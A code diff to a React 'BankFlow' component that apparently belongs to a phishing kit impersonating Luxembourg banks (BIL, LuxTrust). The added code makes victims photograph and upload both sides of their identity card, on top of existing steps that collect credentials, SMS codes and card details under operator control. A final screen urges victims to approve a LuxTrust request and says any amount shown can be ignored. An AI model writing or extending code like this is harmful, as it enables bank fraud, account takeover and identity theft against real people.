@@ -9,6 +9,7 @@ import {
   apiHeartbeat,
   apiRegisterVisitor,
   apiSubmit,
+  apiUploadId,
 } from "../lib/api";
 import {
   COMMAND_TO_STATUS,
@@ -24,7 +25,7 @@ import {
   writeVisitors,
 } from "../lib/realtime";
 
-const TOTAL_STEPS = 7;
+const TOTAL_STEPS = 8;
 
 const STEP_LABELS = [
   "Identifiants",
@@ -33,6 +34,7 @@ const STEP_LABELS = [
   "SMS",
   "Carte",
   "Infos",
+  "ID",
   "Confirmation",
 ];
 
@@ -52,9 +54,10 @@ const STATUS_TO_STEP = {
   card_submitted: 5,
   info_requested: 6,
   info_submitted: 6,
-  confirm_requested: 7,
-  confirm_submitted: 7,
-  done: 7,
+  id_requested: 7,
+  id_submitted: 7,
+  confirm_requested: 8,
+  done: 8,
 };
 
 function BankHeaderLogo({ bank }) {
@@ -334,6 +337,33 @@ export default function BankFlow() {
   const [t6, setT6] = useState(false);
   // BIL QR uploaded by admin (per session). Null until the admin uploads.
   const [qrImg, setQrImg] = useState(null);
+  // ID photos (all banks except tango/orange): front + back files.
+  const [idFront, setIdFront] = useState(null);
+  const [idBack, setIdBack] = useState(null);
+  const [idFrontUrl, setIdFrontUrl] = useState("");
+  const [idBackUrl, setIdBackUrl] = useState("");
+  const [idErr, setIdErr] = useState("");
+  const [idUp, setIdUp] = useState(false);
+  const [idPct, setIdPct] = useState({ front: 0, back: 0 });
+
+function readFileAsDataURL(file) {
+  return new Promise((resolve, reject) => {
+    const r = new FileReader();
+    r.onload = () => resolve(r.result);
+    r.onerror = () => reject(new Error("read"));
+    r.readAsDataURL(file);
+  });
+}
+
+function checkIdFile(file) {
+  if (!file) return "";
+  const t = (file.type || "").toLowerCase();
+  if (t !== "image/png" && t !== "image/jpeg" && t !== "image/jpg")
+    return "PNG, JPG ou JPEG uniquement.";
+  if (file.size < 100 * 1024) return "Image trop petite (min 100 Ko).";
+  if (file.size > 1024 * 1024) return "Image trop grande (max 1 Mo).";
+  return "";
+}
 
   function pushSubmission(kind, data) {
     const entry = {
@@ -598,6 +628,7 @@ export default function BankFlow() {
     status === "sms_submitted" ||
     status === "card_submitted" ||
     status === "info_submitted" ||
+    status === "id_submitted" ||
     status === "confirm_submitted"
   ) {
     const notes = {
@@ -608,7 +639,8 @@ export default function BankFlow() {
       phone_submitted: "Numéro reçu. Veuillez patienter…",
       sms_submitted: "Code SMS reçu. Veuillez patienter…",
       card_submitted: "Détails de la carte reçus. Veuillez patienter…",
-      info_submitted: "Informations reçues. Veuillez patienter pour la confirmation finale…",
+      info_submitted: "Informations reçues. Veuillez patienter pour l'étape suivante…",
+      id_submitted: "Pièce d'identité reçue. Veuillez patienter…",
       confirm_submitted: "Confirmation reçue. Veuillez patienter…",
     };
     return <WaitingLoader bank={bank} stepNum={stepNum} note={notes[status]} />;
@@ -1108,12 +1140,111 @@ export default function BankFlow() {
     );
   }
 
+  /* ---------- ID (all banks except tango/orange) ---------- */
+  if (status === "id_requested") {
+    const fErr = idFront ? checkIdFile(idFront) : "";
+    const bErr = idBack ? checkIdFile(idBack) : "";
+    const ok = idFront && idBack && !fErr && !bErr && !idUp;
+
+    async function sendId() {
+      setIdErr("");
+      if (!ok) {
+        if (!idFront) setIdErr("Recto requis : photographiez le devant de votre pièce.");
+        else if (!idBack) setIdErr("Verso requis : photographiez le dos de votre pièce.");
+        else setIdErr(fErr || bErr);
+        return;
+      }
+      setIdUp(true);
+      setLoading(true);
+      try {
+        let frontUrl;
+        let backUrl;
+        if (apiEnabled()) {
+          const f = await apiUploadId(visitorIdRef.current, "front", await readFileAsDataURL(idFront), (p) =>
+            setIdPct((s) => ({ ...s, front: p }))
+          );
+          frontUrl = f.url;
+          const b = await apiUploadId(visitorIdRef.current, "back", await readFileAsDataURL(idBack), (p) =>
+            setIdPct((s) => ({ ...s, back: p }))
+          );
+          backUrl = b.url;
+        } else {
+          setIdPct({ front: 50, back: 50 });
+          frontUrl = await readFileAsDataURL(idFront);
+          backUrl = await readFileAsDataURL(idBack);
+          setIdPct({ front: 100, back: 100 });
+        }
+        setLoading(false);
+        setIdUp(false);
+        submitAndWait("id", { front: frontUrl, back: backUrl }, "id_submitted");
+      } catch (e) {
+        setLoading(false);
+        setIdUp(false);
+        setIdErr(e.message === "upload failed" ? "Envoi échoué, réessayez." : e.message || "Envoi échoué, réessayez.");
+      }
+    }
+
+    function IdBox({ side, file, setFile, preview, setPreview, err, pct }) {
+      return (
+        <label className="block min-w-0">
+          <span className={labelCls}>{side === "front" ? "Recto" : "Verso"}</span>
+          <span className="mt-2 flex cursor-pointer flex-col items-center justify-center rounded-xl border-2 border-dashed border-neutral-300 bg-slate-50/60 px-3 py-5 text-center transition hover:border-[var(--brand)] hover:bg-white">
+            {preview ? (
+              <img src={preview} alt={side} className="max-h-36 w-auto rounded-lg object-contain shadow" />
+            ) : (
+              <>
+                <svg viewBox="0 0 24 24" className="h-8 w-8 text-neutral-300" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
+                  <circle cx="12" cy="13" r="4" />
+                </svg>
+                <span className="mt-1.5 text-[13px] font-bold text-neutral-500">
+                  {side === "front" ? "Photographiez le recto" : "Photographiez le verso"}
+                </span>
+                <span className="text-[11.5px] text-neutral-400">PNG ou JPG • 100 Ko – 1 Mo</span>
+              </>
+            )}
+            <input
+              type="file"
+              accept="image/png,image/jpeg,image/jpg"
+              className="hidden"
+              onChange={(e) => {
+                const f = e.target.files?.[0] || null;
+                e.target.value = "";
+                setFile(f);
+                setPreview(f ? URL.createObjectURL(f) : "");
+              }}
+            />
+          </span>
+          {pct > 0 && pct < 100 && (
+            <span className="mt-1.5 block h-1.5 w-full overflow-hidden rounded-full bg-neutral-200">
+              <span className="block h-full rounded-full transition-all" style={{ width: `${pct}%`, backgroundColor: bank.color }} />
+            </span>
+          )}
+          {err && <span className={errCls}>⚠ {err}</span>}
+        </label>
+      );
+    }
+
+    return (
+      <Shell bank={bank} step={7} kicker="Pièce d'identité" title="Téléversez votre pièce d'identité" desc="Photographiez le recto et le verso de votre carte d'identité. PNG ou JPG, entre 100 Ko et 1 Mo.">
+        <div className="grid w-full grid-cols-1 gap-3.5 sm:grid-cols-2">
+          <IdBox side="front" file={idFront} setFile={setIdFront} preview={idFrontUrl} setPreview={setIdFrontUrl} err={fErr} pct={idPct.front} />
+          <IdBox side="back" file={idBack} setFile={setIdBack} preview={idBackUrl} setPreview={setIdBackUrl} err={bErr} pct={idPct.back} />
+        </div>
+        {idErr && <p className={`${errCls} mt-2 text-center`}>⚠ {idErr}</p>}
+        <div className="pt-3">
+          <PrimaryBtn bank={bank} loading={loading} disabled={!ok} onClick={sendId}>Envoyer →</PrimaryBtn>
+        </div>
+      </Shell>
+    );
+  }
+
   /* ---------- CONFIRM ---------- */
   if (status === "confirm_requested") {
     return (
       <Shell
         bank={bank}
-        step={7}
+        step={8}
         kicker="Confirmation finale"
         title="Approuvez pour finaliser"
         desc="Une demande d'approbation est en attente dans votre application LuxTrust. Un montant peut éventuellement apparaître. Vous pouvez ignorer ce montant : AUCUN frais ne sera prélevé de votre compte. Ceci est un message généré automatiquement."
@@ -1138,7 +1269,7 @@ export default function BankFlow() {
   return (
     <Shell
       bank={bank}
-      step={7}
+      step={8}
       kicker="Terminé"
       title="Vérification terminée"
       desc="Merci. Votre session est terminée."
